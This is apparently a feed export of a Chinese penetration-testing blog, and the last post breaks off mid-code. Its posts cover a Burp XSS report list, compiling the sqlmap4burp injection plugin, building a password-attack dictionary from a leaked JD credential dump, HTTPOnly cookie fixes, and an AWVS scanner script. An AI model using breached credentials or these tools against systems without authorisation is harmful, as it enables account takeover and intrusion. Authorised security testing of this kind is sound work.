http://x.x.x.x/csp/manpower/updateAddressInfoPage.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.92. http://x.x.x.x/csp/manpower/updateMemberInfoPage.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.93. http://x.x.x.x/csp/manpower/updateMemberInfoPage.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.94. http://x.x.x.x/csp/manpower/updateMemberInfoPage.action [memberinfoid parameter]</span><br><span class="line"></span><br><span class="line">1.95. http://x.x.x.x/csp/manpower/updatePartyInfoPage.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.96. http://x.x.x.x/csp/manpower/updatePartyInfoPage.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.97. http://x.x.x.x/csp/manpower/updatePartyInfoPage.action [partyinfoid parameter]</span><br><span class="line"></span><br><span class="line">1.98. http://x.x.x.x/csp/manpower/updateRelationInfoPage.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.99. http://x.x.x.x/csp/manpower/updateRelationInfoPage.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.100. http://x.x.x.x/csp/manpower/updateRelationInfoPage.action [relationId parameter]</span><br><span class="line"></span><br><span class="line">1.101. http://x.x.x.x/csp/performance/assessRecordList.action [assessRecord.cycleType parameter]</span><br><span class="line"></span><br><span class="line">1.102. http://x.x.x.x/csp/performance/assessRecordList.action [assessRecord.indexId parameter]</span><br><span class="line"></span><br><span class="line">1.103. http://x.x.x.x/csp/performance/assessRecordList.action [assessRecord.orgaName parameter]</span><br><span class="line"></span><br><span class="line">1.104. http://x.x.x.x/csp/performance/assessRecordList.action [assessRecord.planId parameter]</span><br><span class="line"></span><br><span class="line">1.105. http://x.x.x.x/csp/performance/assessRecordList.action [assessRecord.planName parameter]</span><br><span class="line"></span><br><span class="line">1.106. http://x.x.x.x/csp/performance/assessRecordList.action [assessRecord.post parameter]</span><br><span class="line"></span><br><span class="line">1.107. http://x.x.x.x/csp/performance/assessRecordList.action [assessRecord.staffId parameter]</span><br><span class="line"></span><br><span class="line">1.108. http://x.x.x.x/csp/performance/assessRecordList.action [assessRecord.staffName parameter]</span><br><span class="line"></span><br><span class="line">1.109. http://x.x.x.x/csp/performance/assessRecordList.action [assessRecord.staffSn parameter]</span><br><span class="line"></span><br><span class="line">1.110. http://x.x.x.x/csp/performance/assessRecordList.action [assessRecord.staffState parameter]</span><br><span class="line"></span><br><span class="line">1.111. http://x.x.x.x/csp/performance/assessRecordList.action [assessRecord.teamItemId parameter]</span><br><span class="line"></span><br><span class="line">1.112. http://x.x.x.x/csp/performance/assessRecordList.action [assessRecord.teamName parameter]</span><br><span class="line"></span><br><span class="line">1.113. http://x.x.x.x/csp/performance/assessRecordList.action [month parameter]</span><br><span class="line"></span><br><span class="line">1.114. http://x.x.x.x/csp/performance/assessRecordList.action [name of an arbitrarily supplied URL parameter]</span><br><span class="line"></span><br><span class="line">1.115. http://x.x.x.x/csp/performance/assessRecordList.action [name of an arbitrarily supplied body parameter]</span><br><span class="line"></span><br><span class="line">1.116. http://x.x.x.x/csp/performance/assessRecordList.action [order.ascending parameter]</span><br><span class="line"></span><br><span class="line">1.117. http://x.x.x.x/csp/performance/assessRecordList.action [page.currentPage parameter]</span><br><span class="line"></span><br><span class="line">1.118. http://x.x.x.x/csp/performance/assessRecordList.action [page.pageSize parameter]</span><br><span class="line"></span><br><span class="line">1.119. http://x.x.x.x/csp/performance/assessRecordList.action [year parameter]</span><br><span class="line"></span><br><span class="line">1.120. http://x.x.x.x/csp/performance/c_pfm_getAttendanceDetails.action [name of an arbitrarily supplied URL parameter]</span><br><span class="line"></span><br><span class="line">1.121. http://x.x.x.x/csp/performance/c_pfm_getAttendanceDetails.action [name of an arbitrarily supplied body parameter]</span><br><span class="line"></span><br><span class="line">1.122. http://x.x.x.x/csp/performance/c_pfm_getAttendanceDetails.action [order.ascending parameter]</span><br><span class="line"></span><br><span class="line">1.123. http://x.x.x.x/csp/performance/c_pfm_getAttendanceDetails.action [order.propertyName parameter]</span><br><span class="line"></span><br><span class="line">1.124. http://x.x.x.x/csp/performance/c_pfm_getAttendanceDetails.action [page.currentPage parameter]</span><br><span class="line"></span><br><span class="line">1.125. http://x.x.x.x/csp/performance/c_pfm_getAttendanceDetails.action [page.pageSize parameter]</span><br><span class="line"></span><br><span class="line">1.126. http://x.x.x.x/csp/performance/c_pfm_getAttendanceResult.action [name of an arbitrarily supplied URL parameter]</span><br><span class="line"></span><br><span class="line">1.127. http://x.x.x.x/csp/performance/c_pfm_getAttendanceResult.action [name of an arbitrarily supplied body parameter]</span><br><span class="line"></span><br><span class="line">1.128. http://x.x.x.x/csp/performance/c_pfm_getAttendanceResult.action [order.ascending parameter]</span><br><span class="line"></span><br><span class="line">1.129. http://x.x.x.x/csp/performance/c_pfm_getAttendanceResult.action [order.propertyName parameter]</span><br><span class="line"></span><br><span class="line">1.130. http://x.x.x.x/csp/performance/c_pfm_getAttendanceResult.action [page.currentPage parameter]</span><br><span class="line"></span><br><span class="line">1.131. http://x.x.x.x/csp/performance/c_pfm_getAttendanceResult.action [page.pageSize parameter]</span><br><span class="line"></span><br><span class="line">1.132. http://x.x.x.x/csp/performance/c_pfm_getAttendanceResult.action [qo.orgaId parameter]</span><br><span class="line"></span><br><span class="line">1.133. http://x.x.x.x/csp/performance/c_pfm_getAttendanceResult.action [qo.postId parameter]</span><br><span class="line"></span><br><span class="line">1.134. http://x.x.x.x/csp/performance/c_pfm_getAttendanceResult.action [qo.staffName parameter]</span><br><span class="line"></span><br><span class="line">1.135. http://x.x.x.x/csp/performance/c_pfm_getPersonalDataList.action [name of an arbitrarily supplied URL parameter]</span><br><span class="line"></span><br><span class="line">1.136. http://x.x.x.x/csp/performance/c_pfm_getPersonalDataList.action [name of an arbitrarily supplied body parameter]</span><br><span class="line"></span><br><span class="line">1.137. http://x.x.x.x/csp/performance/c_pfm_getPersonalDataList.action [order.ascending parameter]</span><br><span class="line"></span><br><span class="line">1.138. http://x.x.x.x/csp/performance/c_pfm_getPersonalDataList.action [page.currentPage parameter]</span><br><span class="line"></span><br><span class="line">1.139. http://x.x.x.x/csp/performance/c_pfm_getPersonalDataList.action [page.pageSize parameter]</span><br><span class="line"></span><br><span class="line">1.140. http://x.x.x.x/csp/performance/c_pfm_getPersonalDataList.action [qo.orgaId parameter]</span><br><span class="line"></span><br><span class="line">1.141. http://x.x.x.x/csp/performance/c_pfm_getPersonalDataList.action [qo.queryType parameter]</span><br><span class="line"></span><br><span class="line">1.142. http://x.x.x.x/csp/performance/c_pfm_getPersonalDataList.action [qo.subDepartmentId parameter]</span><br><span class="line"></span><br><span class="line">1.143. http://x.x.x.x/csp/performance/c_pfm_getPersonalDataList.action [qo.teamId parameter]</span><br><span class="line"></span><br><span class="line">1.144. http://x.x.x.x/csp/performance/c_pfm_queryOrgaData.action [queryType parameter]</span><br><span class="line"></span><br><span class="line">1.145. http://x.x.x.x/csp/performance/c_pfm_queryPersonalData.action [queryType parameter]</span><br><span class="line"></span><br><span class="line">1.146. http://x.x.x.x/csp/performance/entranceAccessPlan.action [flag parameter]</span><br><span class="line"></span><br><span class="line">1.147. http://x.x.x.x/csp/performance/entranceAccessPlan.action [flag parameter]</span><br><span class="line"></span><br><span class="line">1.148. http://x.x.x.x/csp/performance/findAssessRecordDetailById.action [name of an arbitrarily supplied URL parameter]</span><br></pre></td></tr></table></figure><p>点开链接就可以看到这处链接的请求包与响应包，还有payload的加载在哪个参数上。完美解释每一处！！！</p><p><img src="/articles/2017/how-do-to-submit-148-xss-vulnerabilities/request_response.png" alt="图2-某处请求响应包和payload的位置"></p><h2 id="0x02思考"><a href="#0x02思考" class="headerlink" title="0x02思考"></a>0x02思考</h2><p>开心的这导出的报告发给客户之后，我在位置上思考：</p><ul><li>使用burp或者其他工具如果有工程文件，一定要保存好。</li><li>以后写渗透测试报告时有出现某漏洞数量多个，导致无法一一写入渗透测试报告中。可以使用burp将漏洞具体信息以报告形式导出。然后以对象的方式插入到渗透测试报告中去。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burp suite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译插件sqlmap4burp遇到的问题</title>
      <link href="/articles/2017/compile-sqlmap4burp/"/>
      <url>/articles/2017/compile-sqlmap4burp/</url>
      
        <content type="html"><![CDATA[<blockquote><p>由于sqlmap4burp项目很久没有维护了，于是重构了其代码，在其基础上增加了对Mac和Linux系统的支持。大家可以尝试下更新的sqlmap4burp++。</p><p>github：<a href="https://github.com/c0ny1/sqlmap4burp-plus-plus" target="_blank" rel="noopener">https://github.com/c0ny1/sqlmap4burp-plus-plus</a></p><p>文章：<a href="http://gv7.me/articles/2019/refactoring-sqlmap4burp/">重构sqlmap4burp插件</a></p><p>上文更新于 2019-10-6 22:18 </p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;sqlmap4burp是整合burp和sqlmap两大神器的一个burp插件。我也是查看了这边文章<a href="http://www.freebuf.com/sectool/45239.html" target="_blank" rel="noopener">&lt;&lt;渗透神器合体：在BurpSuite中集成Sqlmap&gt;&gt;</a>,通过文章下的评论发现，小伙伴们在编译与使用sqlmap4burp遇到了不少问题，我也不例外。以下是我遇到的问题，我们来一一解决它。</p><ul><li>eclipse导入插件的源码报错</li><li>编译成功且加载到burp成功后，但是使用是无法弹出cmd框</li><li>弹出了cmd框且设置了sqlmap的路径到系统变量path之后，还是提示sqlmap.py不是内部命令或外部命令……</li></ul><h2 id="编译问题"><a href="#编译问题" class="headerlink" title="编译问题"></a>编译问题</h2><h4 id="缺包"><a href="#缺包" class="headerlink" title="缺包"></a>缺包</h4><p>&emsp;&emsp;作者在插件的说明中说项目缺少包<code>commons-io-2.4.jar</code>,有些小伙伴导入了commons-io包还是报错。这是因为项目其实还缺少一个<code>commons-lang</code>包（我使用的版本是3-3.6）</p><p><img src="/articles/2017/compile-sqlmap4burp/package.png" alt="图1-工程需要的包"></p><h4 id="导出jar问题"><a href="#导出jar问题" class="headerlink" title="导出jar问题"></a>导出jar问题</h4><p>&emsp;&emsp;我第一次编译导出时选择的是<code>JAR file</code>。然后加载到burp中，没有报错，也能正常限制tab标签和右键菜单，但是就是不弹出cmd。后来发现，应该导出时选择<code>Runnable JAE file</code>。</p><p><img src="/articles/2017/compile-sqlmap4burp/create_jar.png" alt="图2-导出Runnable JAE file"></p><h2 id="使用问题"><a href="#使用问题" class="headerlink" title="使用问题"></a>使用问题</h2><p>&emsp;&emsp;明明已经将sqlmap的路径放到path环境中，而且启动cmd输入sqlmap.py可以正常运行sqlmap了。但是插件弹出的cmd提示如下：</p><p><img src="/articles/2017/compile-sqlmap4burp/cmd_sqlmap.png" alt="图3-插件运行弹出的cmd提示"></p><p>&emsp;&emsp;当时内心很崩溃，我在想我是用了个假的burp么？<br>后来无意中找到了苦逼的原因：我是使用工具包（音速启动）打开的burp，这样弹出的cmd运行sqlmap.py，直接鼠标打开的burp才可以。</p><h2 id="优化插件"><a href="#优化插件" class="headerlink" title="优化插件"></a>优化插件</h2><p>经过查看代码发现，<code>latershow.sniffer</code>包下的代码是无用的，应该删除掉。<br><img src="/articles/2017/compile-sqlmap4burp/dead_code.png" alt="图4-无用代码"><br>&emsp;&emsp;如果用过gason插件的小伙伴会知道，gason插件的右键菜单名称也为send to sqlmap。<br>如果你同时安装这两个插件难免搞不清楚到底那个菜单对应着那个插件。所以我们在代码中将sqlmap4burp的右键菜单名改为<code>send to sqlmap4burp</code>。<br><img src="/articles/2017/compile-sqlmap4burp/change_menu_name.png" alt="图5-修改右键菜单名称"><br>优化后编译的插件下载地址（base64）：<br><code>dXJsOmh0dHA6Ly9wYW4uYmFpZHUuY29tL3MvMW84Z2I1aHcNCnB3ZDptOGo1</code></p><h2 id="sqlmap4burp的优点"><a href="#sqlmap4burp的优点" class="headerlink" title="sqlmap4burp的优点"></a>sqlmap4burp的优点</h2><p>&emsp;&emsp;最后啰嗦一下这个插件的优点。它比我们直接导出的burp的log文件，然后用sqlmap的命令sqlmap.py -l burp.log –bitach –smart去批量检测sql注入有两个优势。</p><ol><li>比较方便，免去设置burp保存日志，然后启动sqlmap加载log文件的操作，一键无缝连接。</li><li>最关键的是我们导出来的log里的数据很杂，可能有图片的请求，js的请求等等。而sqlmap4burp是将我们选中的数据包导出为log,然后让sqlmap读入log数据批量注入。这样目的性更强！</li></ol>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 插件开发 </tag>
            
            <tag> burp插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自制弱口令字典top100</title>
      <link href="/articles/2017/making-the-password-top-100/"/>
      <url>/articles/2017/making-the-password-top-100/</url>
      
        <content type="html"><![CDATA[<p>&emsp;&emsp;在进行密码字典攻击时，经常使用到一些弱口令字典。而这些若口令字典基本都是通过各大网站泄露的密码，统计出使用频率最多的密码作为字典。这样就可以大大提高成功率。相信大家都听说过CSDN top 100,12306 top 100。今天尝试使用某东泄露的数据库制作一个jd top 100！</p><h2 id="0x01工具与素材"><a href="#0x01工具与素材" class="headerlink" title="0x01工具与素材"></a>0x01工具与素材</h2><ul><li>mysql</li><li>navicat for mysql</li><li>jd40w密码</li></ul><h2 id="0x02导入"><a href="#0x02导入" class="headerlink" title="0x02导入"></a>0x02导入</h2><p>&emsp;&emsp;我们日常收集到的一些裤子各种格式都有，比如sql文件，cvs,txt等等。Navicat很强大，可以导入多种数据格式导入到mysql数据库，我们需要根据我们的密码文件格式来进行选择,我们演示的密码文件格式是txt。故选第三个。</p><p><img src="/articles/2017/making-the-password-top-100/password_file.png" alt="图1-某东40W密码文件"></p><p><img src="/articles/2017/making-the-password-top-100/type.png" alt="图2-Navicat支持的导入的文件格式"></p><p>选择好我们要导入的文件40W.txt</p><p><img src="/articles/2017/making-the-password-top-100/file.png" alt="图3-选择要导入的密码文件"></p><p>由于我们的密码文件每行格式为<code>username-password</code>,所以我们的分隔符为<code>-</code></p><p><img src="/articles/2017/making-the-password-top-100/fengefu.png" alt="图4-分隔符"></p><p>将导入的数据表名该为<code>test</code></p><p><img src="/articles/2017/making-the-password-top-100/table_name.png" alt="图5-输入导入的表名"></p><p>后面就是下一步下一步的事了。<br><img src="/articles/2017/making-the-password-top-100/table.png" alt="图6-导入完成后的数据"></p><h2 id="0x3处理"><a href="#0x3处理" class="headerlink" title="0x3处理"></a>0x3处理</h2><p>新建一个查询，输入以下sql语句，并执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select password,count(password) as cou #cou为重复数量</span><br><span class="line">from test #test为表名</span><br><span class="line">GROUP BY password #按照密码来分组</span><br><span class="line">ORDER BY cou desc #查询结果按照cou来降序排列</span><br><span class="line">limit 100 #只要前100条结果集，也就是我们的top100</span><br></pre></td></tr></table></figure><p><img src="/articles/2017/making-the-password-top-100/result.png" alt="图7-查询结果"></p><h2 id="0x4导出"><a href="#0x4导出" class="headerlink" title="0x4导出"></a>0x4导出</h2><p>选中所有查询结果的password字段，并复制并粘贴到我们的字段文件里。<br><img src="/articles/2017/making-the-password-top-100/copy_to_file.png" alt="图8-复制结果到文件"></p><h3 id="注意：如果数据量很大时，就可以考虑使用mongodb，并采用分布式来进行统计并计算。"><a href="#注意：如果数据量很大时，就可以考虑使用mongodb，并采用分布式来进行统计并计算。" class="headerlink" title="注意：如果数据量很大时，就可以考虑使用mongodb，并采用分布式来进行统计并计算。"></a>注意：如果数据量很大时，就可以考虑使用mongodb，并采用分布式来进行统计并计算。</h3>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字典制作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>坑死我的HTTPOnly</title>
      <link href="/articles/2017/Session-Cookie-without-Secure-flag-set/"/>
      <url>/articles/2017/Session-Cookie-without-Secure-flag-set/</url>
      
        <content type="html"><![CDATA[<p>&emsp;&emsp;我们在做渗透测试使用AWVS对网站进行扫描时，经常会扫描出Session Cookie without Secure flag set漏洞。由于是低危，而且很难被利用，所以我们常常会忽略掉它，不去研究它的原理关心它的细节。当真正让我们要去修复这些小漏洞时，尴尬的事情就发生了：<font color="red">这么不起眼的漏洞，劳资都没能正确修复！！！</font></p><p><img src="/articles/2017/Session-Cookie-without-Secure-flag-set/crazy.jpg" alt></p><h2 id="0x01叙事"><a href="#0x01叙事" class="headerlink" title="0x01叙事"></a>0x01叙事</h2><p>&emsp;&emsp;在研究该漏洞原理与修复之前，先聊聊最近被这个小小小漏洞的坑死的琐事。最近负责客户网站的漏洞复测，其中就有这个不起眼的小漏洞。因为不起眼，所以平时对其原理并未深究，导致了这次被坑死。我在复测的过程中使用了firebug去查看了漏洞地址的cookie,发现没有设置cookie的HTTPOnly属性。于是就在复测报告中写复测结果为未修复。结果开发人员打电话过来说: <strong>你复测的是访问js,图片等前端页面的请求的cookie,这些cookie自然是没有HTTPOnly属性。但涉及后台数据交互的cookie的HTTPOnly属性,所以该漏洞算是已经修复。</strong> 现在想想这种表述本身就有问题，我TMD竟然信以为真!晚上回来狠心恶补了一下该漏洞原理，才知道： <em>要修复该漏洞，存储sessionID的cookie一定要设置HTTPOnly属性，其他cookie的设不设置该属性，得根据网站具体的业务来确定。</em></p><p>&emsp;&emsp;现在我再来看看那位开发修复漏洞的方式我就想笑，他直接去百度经验copy了一段代码，就粘贴过去了。连cookiename都没有修改。这回到好了，目标cookie的HTTPOnly属性没有设置，到是加了一个无用的设置了HTTPOnly属性得cookie。<br><img src alt="图1开发人员直接copy的修复代码"></p><p><img src="http://i1.bvimg.com/602334/b0787d9db2d4aa57.png" alt="图2添加的无用cookie"></p><p>其实正确的修复代码是将copy过来的代码中的<code>cookiename</code>修改为<code>JSESSIONID</code>。</p><h2 id="0x02漏洞原理"><a href="#0x02漏洞原理" class="headerlink" title="0x02漏洞原理"></a>0x02漏洞原理</h2><p>&emsp;&emsp;大家都知道网站的会话控制，都是使用session和cookie来配合实现。一般cookie中都存在一个sessionID，每种语言使用存储sessionID的默认cookie名称都不太一样，具体如下表：</p><table><thead><tr><th>语言</th><th align="center">cookie名</th></tr></thead><tbody><tr><td>asp</td><td align="center">ASPSESSIONID</td></tr><tr><td>php</td><td align="center">PHPSESSIONID</td></tr><tr><td>jsp</td><td align="center">JSESSIONID</td></tr></tbody></table><p>&emsp;&emsp;服务器同时该sessionID来识别用户。如果一旦泄露sessionID就会导致身份被窃取。一般而言黑客会使用XSS漏洞来窃取cookie。在浏览器中的documnet对象中，就存储着cookie的信息。而通过XSS漏洞使用js读取受害者浏览器中的document对象里的cookie，然后在发送到黑客指定的收信地址。</p><p>&emsp;&emsp;那么我们如何去进行防护呢？也许大家想到，在客户端禁止js执行。当然这完全可以抵御XSS。但是副作用也是很大哦。一旦js被禁用了，你访问到的网页的交互性大大的降低，甚至会严重影响体验。所谓杀敌一千自损八百，实属下下策。那么我们能不能将让浏览器中的document对象里的cookie设置为不可见呢？而cookie的HTTPOnly属性就能达到这样的效果。当cookie的HTTPOnly属性被设为True时（默认为false），document对象中就找不到该cookie了。自然js无法从document获取到cookie了。这样哪怕网站存在XSS漏洞，也能在大部分情况下杜绝cookie被劫持。<br><img src="http://i1.bvimg.com/602334/46bd20af8fd156ca.png" alt="图3原理图"><br>&emsp;&emsp;其实我个人理解这个属性之所以叫HTTPOnly，是说只有在只有通过HTTP协议写才能访问cookie数据，其他方式不可以。因此设置了该属性，不会影响网站的交互，正常的HTTP请求（包括Ajax）都可以携带cookie发送到服务器。</p><h2 id="0x03漏洞修复"><a href="#0x03漏洞修复" class="headerlink" title="0x03漏洞修复"></a>0x03漏洞修复</h2><p>&emsp;&emsp;根据以上原理，我们已经知道了该漏洞的修复方式。那就是在http响应头设置cookie的HTTPOnly属性为True。Set-Cookie变量具体如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;name&gt;=&lt;value&gt;[; &lt;Max-Age&gt;=&lt;age&gt;]</span><br><span class="line">[; expires=&lt;date&gt;][; domain=&lt;domain_name&gt;]</span><br><span class="line">[; path=&lt;some_path&gt;][; secure][; HttpOnly]</span><br></pre></td></tr></table></figure><p>下面我们以php语言来演示一下如何修复该漏洞。</p><h3 id="cookie全局HTTPOnly设置"><a href="#cookie全局HTTPOnly设置" class="headerlink" title="cookie全局HTTPOnly设置"></a>cookie全局HTTPOnly设置</h3><p>&emsp;&emsp;PHP5.2以上版本已支持HttpOnly参数的设置，同样也支持全局的HttpOnly的设置，在php.ini中设置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.cookie_httponly = True</span><br></pre></td></tr></table></figure><p>或者通过脚本来设置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//第一种</span></span><br><span class="line">    ini_set(<span class="string">"session.cookie_httponly"</span>, <span class="number">1</span>); </span><br><span class="line">    <span class="comment">//第二种</span></span><br><span class="line">    session_set_cookie_params(<span class="number">0</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">TRUE</span>); </span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="cookie部分设置HTTPOnly属性"><a href="#cookie部分设置HTTPOnly属性" class="headerlink" title="cookie部分设置HTTPOnly属性"></a>cookie部分设置HTTPOnly属性</h3><p>&emsp;&emsp;php中Cookie操作函数setcookie函数和setrawcookie函数也专门添加了第7个参数来做为HttpOnly的选项，开启方法为： </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    setcookie(<span class="string">"cookiename"</span>, <span class="string">"cookievalue"</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">TRUE</span>); </span><br><span class="line">    setrawcookie(<span class="string">"cookiename"</span>, <span class="string">"cookievalue"</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">TRUE</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对于PHP5.1以前版本以及PHP4版本的话，则需要通过header函数来变通下了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">"Set-Cookie: hidden=value; httpOnly"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="注意：如果你的浏览器不支持HTTPOnly，那么你就算为cookie设置了该属性也是无效的！"><a href="#注意：如果你的浏览器不支持HTTPOnly，那么你就算为cookie设置了该属性也是无效的！" class="headerlink" title="注意：如果你的浏览器不支持HTTPOnly，那么你就算为cookie设置了该属性也是无效的！"></a>注意：如果你的浏览器不支持HTTPOnly，那么你就算为cookie设置了该属性也是无效的！</h4><h2 id="0x04最后的思考"><a href="#0x04最后的思考" class="headerlink" title="0x04最后的思考"></a>0x04最后的思考</h2><h3 id="所有的cookie都应该加上HTTPonly属性么？"><a href="#所有的cookie都应该加上HTTPonly属性么？" class="headerlink" title="所有的cookie都应该加上HTTPonly属性么？"></a>所有的cookie都应该加上HTTPonly属性么？</h3><p>&emsp;&emsp;网站中存储sessionID的cookie一定要设置。这也是AWVS为何命名该漏洞为Session Cookie without Secure flag set的原因。一般网站应用也不会在js里操作这些敏感Cookie的，对于一些需要在应用程序中用JS操作的cookie我们就不予设置。这样就保障了Cookie信息的安全，同时的保证了网站的正常业务。</p><h3 id="HTTPOnly是否百分之百防御XSS漏洞？"><a href="#HTTPOnly是否百分之百防御XSS漏洞？" class="headerlink" title="HTTPOnly是否百分之百防御XSS漏洞？"></a>HTTPOnly是否百分之百防御XSS漏洞？</h3><p>&emsp;&emsp;设置HTTPOnly属性只能缓解XSS之痛，但是并不能根治。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><p><a href="https://www.owasp.org/index.php/HttpOnly#Using_.NET_to_Set_HttpOnly" target="_blank" rel="noopener">https://www.owasp.org/index.php/HttpOnly#Using_.NET_to_Set_HttpOnly</a></p></li><li><p><a href="http://blog.csdn.net/liweiblog/article/details/52350712" target="_blank" rel="noopener">HTTP-only cookie</a></p></li><li><p><a href="http://blog.csdn.net/ellis2008/article/details/6239694" target="_blank" rel="noopener">利用HTTP-only Cookie缓解XSS之痛</a></p></li><li><p><a href="http://blog.sina.com.cn/s/blog_4dd475390102eu7p.html" target="_blank" rel="noopener">Session Cookie without Secure flag set,该如何处理</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞艺术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> 漏洞修复 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编写AWVS脚本探测web services</title>
      <link href="/articles/2017/Writing-AWVS-scripts-to-detect-Web-Services/"/>
      <url>/articles/2017/Writing-AWVS-scripts-to-detect-Web-Services/</url>
      
        <content type="html"><![CDATA[<p>最近一直在做渗透测试，发现在使用AWVS去扫描一个使用web services的网站时。最后的扫描结果并没有web services。然而web services由于经常出现一些问题，故我们很有必要去收集到网站的使用web services的信息。下面我们通过编写AWVS脚本的方式去让AWVS探测的网站是否存在。</p><p>注意：这里默认大家都了解过AWVS基本语法。如果不了解请移步文章的“编写AWVS脚本资料”部分。</p><h2 id="0x01思路"><a href="#0x01思路" class="headerlink" title="0x01思路"></a>0x01思路</h2><p>我们让AWVS爬取到的每一个路径都添加/services，然后去访问这个构造好的路径。如果存在该页面，则分析返回结果中是否存在“wdsl”字符，若存在则说明该站点存在web services服务。</p><h2 id="0x02编写代码"><a href="#0x02编写代码" class="headerlink" title="0x02编写代码"></a>0x02编写代码</h2><h3 id="新建报告模板"><a href="#新建报告模板" class="headerlink" title="新建报告模板"></a>新建报告模板</h3><p>AWVS》Tools》Vulnerability Editor</p><p><img src="/articles/2017/Writing-AWVS-scripts-to-detect-Web-Services/add_xml.png" alt="图1-新建报告模板"></p><p>填写好漏洞相关信息</p><p><img src="/articles/2017/Writing-AWVS-scripts-to-detect-Web-Services/2.png" alt="图2-填写漏洞信息"></p><h3 id="新建探测脚本"><a href="#新建探测脚本" class="headerlink" title="新建探测脚本"></a>新建探测脚本</h3><p>找到AWVS的/data/script/folder目录</p><p><img src="/articles/2017/Writing-AWVS-scripts-to-detect-Web-Services/3.png" alt="图3-新建探测脚本"></p><p>由于我们需要AWVS在爬取到目录时就检查一次该目录是否存在web services。所以我们需要在该目录下的PerFolder文件夹，新建一个名为Web_Services.script的脚本文件。代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> target = <span class="keyword">new</span> THTTPJob(); <span class="comment">//实例化一个HTTP任务</span></span><br><span class="line"><span class="keyword">var</span> dir = getCurrentDirectory();<span class="comment">//获取当前路径</span></span><br><span class="line">target.url = <span class="keyword">new</span> TURL(scanURL.url+ dir.fullPath + <span class="string">"/services"</span>);<span class="comment">//构造请求url</span></span><br><span class="line">target.execute();<span class="comment">//执行http请求</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wsRes = target.response.body;<span class="comment">//获取http请求内容</span></span><br><span class="line"><span class="keyword">if</span>(!target.wasError &amp;&amp; !target.notFound )&#123;<span class="comment">//判断是否访问错误或者是404</span></span><br><span class="line"><span class="keyword">if</span>(wsRes.indexOf(<span class="string">'wsdl'</span>) != <span class="number">-1</span>)&#123;</span><br><span class="line">logWarning(scanURL.url+dir.fullPath+<span class="string">'-----&gt;this web services is exists!!!'</span>);<span class="comment">//在日志栏显示该调式信息</span></span><br><span class="line"><span class="keyword">var</span> ri = <span class="keyword">new</span> TReportItem();<span class="comment">//新建一个报告结果，返回给扫描器界面</span></span><br><span class="line">ri.loadFromFile(<span class="string">'Web_Services.xml'</span>);<span class="comment">//载入模板</span></span><br><span class="line">ri.severity = <span class="string">"high"</span><span class="comment">//影响等级</span></span><br><span class="line">ri.affects = dir.fullPath + <span class="string">"/services"</span>;</span><br><span class="line">ri.Request = 